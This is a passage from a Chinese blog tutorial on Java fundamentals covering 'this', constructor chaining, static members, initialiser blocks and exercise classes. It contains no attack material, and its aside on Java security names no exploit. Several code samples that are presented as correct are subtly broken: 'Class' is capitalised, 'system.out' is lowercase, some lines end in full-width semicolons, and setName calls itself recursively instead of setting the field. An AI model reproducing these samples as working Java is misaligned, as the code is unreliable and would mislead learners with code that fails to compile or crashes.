执行的时候会发现报错，无法正确进行属性设置。在Java程序中{}是一个结构体的边界福，那么在程序里面设置变量（参数、属性）使用的时候都以{}作为一个查找边界，按照就近取用原则，此时的构造方法并没有能够访问类中的属性，所以此时为了明确类中的属性与参数的区别，往往会在属性前追加this，表示本类的属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">  <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在实际的开发过程中，只要是访问本类的属性，请加上”this”！</p><h5 id="2、this调用类中方法"><a href="#2、this调用类中方法" class="headerlink" title="2、this调用类中方法"></a>2、this调用类中方法</h5><p>​    对于方法的调用分构造方法和普通方法：</p><p>​    构造方法调用（this()）：使用关键字new的时候才会调用构造方法；</p><p>​    普通方法调用（this.方法名称()）:实例化对象产生之后就可以调用普通方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用类中的普通方法：</span></span><br><span class="line">Class Person &#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tell</span><span class="params">()</span>&#123;</span><br><span class="line">    system.out.println(<span class="string">&quot;姓名： &quot;</span>+ <span class="built_in">this</span>.name + <span class="string">&quot;年龄： &quot;</span>+<span class="built_in">this</span>.age);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.setName(name);</span><br><span class="line">    <span class="comment">//setName(name);加和不加一样的，建议加上</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SetAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">per</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小华&quot;</span>,<span class="number">30</span>);</span><br><span class="line">    per.tell();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    对于构造方法的调用，放在构造方法里执行。看下面一个例子：</p><p>​    假设类中一共定义三个构造方法，但是要求不管调用哪个构造方法，都执行一行输出语句“一个新的类的对象实例化”。</p><p>传统做法：    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Class Person &#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    system.out.println(<span class="string">&quot;一个新的类的对象实例化&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">    system.out.println(<span class="string">&quot;一个新的类的对象实例化&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">system.out.println(<span class="string">&quot;一个新的类的对象实例化&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tell</span><span class="params">()</span>&#123;</span><br><span class="line">    system.out.println(<span class="string">&quot;姓名： &quot;</span>+ <span class="built_in">this</span>.name + <span class="string">&quot;年龄： &quot;</span>+<span class="built_in">this</span>.age);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">per</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小华&quot;</span>,<span class="number">30</span>);</span><br><span class="line">    per.tell();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用this：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Class Person &#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    system.out.println(<span class="string">&quot;一个新的类的对象实例化&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>();<span class="comment">//调用无参</span></span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>(name);<span class="comment">//调用单参</span></span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tell</span><span class="params">()</span>&#123;</span><br><span class="line">    system.out.println(<span class="string">&quot;姓名： &quot;</span>+ <span class="built_in">this</span>.name + <span class="string">&quot;年龄： &quot;</span>+<span class="built_in">this</span>.age);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">per</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小华&quot;</span>,<span class="number">30</span>);</span><br><span class="line">    per.tell();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>对于本类构造方法的相互调用需要注意以下几点重要问题！</strong></p><p>​    <strong>1、构造方法必须在实例化新对象的时候调用，所以“this（）”的语句只允许放在构造方法的首行。</strong></p><p>​    <strong>2、构造方法相互调用时请保留程序的出口，不要死循环。</strong></p><hr><h4 id="简单Java类的结构"><a href="#简单Java类的结构" class="headerlink" title="简单Java类的结构"></a>简单Java类的结构</h4><p>​    1、类名称一定要有意义。</p><p>​    2、类之中的所有属性都必须使用private进行封装，同时封装后的属性必须要提供setter、getter方法。</p><p>​    3、类之中可以提供无数多个构造方法，但是必须要保留有无参构造方法。</p><p>​    4、类之中不允许出现任何输出语句，获取内容必须返回。</p><p>​    ps.在进行类的设计的时候，如果发现类中没有属性存在的意义，那么就没必要使用普通方法，因为普通方法需要实例化对象才可以调用。</p><hr><h4 id="Static关键字"><a href="#Static关键字" class="headerlink" title="Static关键字"></a>Static关键字</h4><h5 id="1、Static定义属性（公共属性）"><a href="#1、Static定义属性（公共属性）" class="headerlink" title="1、Static定义属性（公共属性）"></a>1、Static定义属性（公共属性）</h5><p>​    一个类中，属性一旦被定义实际上内容都交给各自的堆内存空间进行保存。在内存中，会有一个全局数据区域，来存储被static关键字修饰的属性。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073518.jpg"                      alt="static关键字"                ></p><p>​    由于static是一个公共属性，虽然可以通过对象进行访问，但规范上应该通过类进行访问，所以static属性可以由类名称直接调用。</p><p>​    <strong>static属性虽然定义在类中，但是其并不收到实例化对象的控制。static属性可以在没有实例化对象的时候使用。</strong></p><p>​    在进行类设计的时候首选的一定是非static属性（大部分），公共信息存储采用static。</p><h5 id="2、Static定义方法"><a href="#2、Static定义方法" class="headerlink" title="2、Static定义方法"></a>2、Static定义方法</h5><p>​    static方法和static属性形同，主要特点在于，可以直接由类名称在没有实例化对象的情况下调用。</p><p>​    对于程序而言，方法有了两种：static方法和非static方法，调用就有了限制：</p><p>​    1、static方法只允许调用static属性或static方法。</p><p>​    2、非static方法允许调用static方法属性或static方法。</p><p>例子：    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String title；</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>；</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">(String title)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.title = title;</span><br><span class="line">    count++;</span><br><span class="line">    System.out.println(<span class="string">&quot;第&quot;</span> + count + <span class="string">&quot;本图书创建出来&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;JSP&quot;</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;Spring&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现一个没名字自动命名</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String title；</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>；</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="string">&quot;NOTITLE - &quot;</span> + count ++)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">(String title)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.title = title;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.title;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;Java&quot;</span>).getTitle());</span><br><span class="line">    System.out.println(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;JSP&quot;</span>).getTitle());</span><br><span class="line">    System.out.println(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;Spring&quot;</span>).getTitle());</span><br><span class="line">    System.out.println(<span class="keyword">new</span> <span class="title class_">Book</span>().getTitle());</span><br><span class="line">    System.out.println(<span class="keyword">new</span> <span class="title class_">Book</span>().getTitle());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><p>​    ps.到了这里算是结构上的东西了，为什么特意提一嘴的，因为我记得在学习CC1的时候（很早以前了都忘完了😭，后面基础完了会陆续再继续写），就专门有静态代码块发生作用的时候了。系列还是以Java安全为主的，所以对于语言的细节真的很重要。</p><p>​    使用{}定义的就是代码块，根据位置不同以及定义的关键字不同，代码块可以分为普通代码块、构造代码块、静态代码块、同步代码块。</p><h5 id="普通代码块"><a href="#普通代码块" class="headerlink" title="普通代码块"></a>普通代码块</h5><p>​    普通代码块的主要特点是定义在一个方法之中的代码块。可以在一个方法之中进行一些结构的拆分，以防止相同变量名称所带来的影响。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">      System.out.println(<span class="string">&quot;x = &quot;</span> + x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;x = &quot;</span>+ x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="构造代码块"><a href="#构造代码块" class="headerlink" title="构造代码块"></a>构造代码块</h5><p>​    定义在一个类之中的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;【构造方法】Person类构造方法执行&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;【构造块】Person构造块执行&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    构造块会优先于构造方法执行，并且每一次实例化新对象的时候都会调用构造块中的内容。</p><h5 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h5><p>​    指的是用static关键字定义的代码块。静态块的定义需要考虑两种情况:</p><p>​    1、非主类中进行静态块的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;【构造方法】Person类构造方法执行&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;【静态块】静态块执行&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;【构造块】Person构造块执行&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073519.jpg"                      alt="静态代码块执行"                ></p><p>​    可以发现静态代码块会优先于构造块执行，不管有多少个实例化对象出现静态代码块都只会出现一次，此代码块的目的是为了静态属性初始化。</p><p>​    2、在主类中进行静态代码块的定义</p><p>​    静态代码块优先于主方法执行。</p><hr><h4 id="总结一"><a href="#总结一" class="headerlink" title="总结一"></a>总结一</h4><p>​    写出以下几个类：</p><p>​    1、写一个代表地址的Address类，地址信息由国家、省份、城市、街道、邮编组成，并可返回完整的地址信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String country;</span><br><span class="line">    <span class="keyword">private</span> String province;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String street;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> zipcode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Address</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Address</span><span class="params">(String country, String province, String city, String street, <span class="type">int</span> zipcode)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.country = country;</span><br><span class="line">        <span class="built_in">this</span>.province = province;</span><br><span class="line">        <span class="built_in">this</span>.city = city;</span><br><span class="line">        <span class="built_in">this</span>.street = street;</span><br><span class="line">        <span class="built_in">this</span>.zipcode = zipcode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCountry</span><span class="params">(String country)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.country = country;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProvince</span><span class="params">(String province)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.province = province;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCity</span><span class="params">(String city)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.city = city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStreet</span><span class="params">(String street)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.street = street;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setZipcode</span><span class="params">(<span class="type">int</span> zipcode)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.zipcode = zipcode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCity</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCountry</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> country;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProvince</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> province;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStreet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> street;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getZipcode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> zipcode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;国家： &quot;</span> + <span class="built_in">this</span>.country + <span class="string">&quot;省份： &quot;</span> + <span class="built_in">this</span>.province + <span class="string">&quot;街道： &quot;</span> + <span class="built_in">this</span>.street + <span class="string">&quot;城市： &quot;</span> + <span class="built_in">this</span>.city + <span class="string">&quot;邮编： &quot;</span> + <span class="built_in">this</span>.zipcode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;中国&quot;</span>, <span class="string">&quot;北京&quot;</span>, <span class="string">&quot;天安门&quot;</span>, <span class="string">&quot;北京&quot;</span>, <span class="number">10001</span>).getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、一个员工类，属性包括“编号”，“姓名”，“基本薪资”，“薪水增长率”，包括计算薪水增长额及操作方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> empno;</span><br><span class="line">    <span class="keyword">private</span> String ename;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> rate;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(<span class="type">long</span> empno, String ename, <span class="type">double</span> salary, <span class="type">double</span> 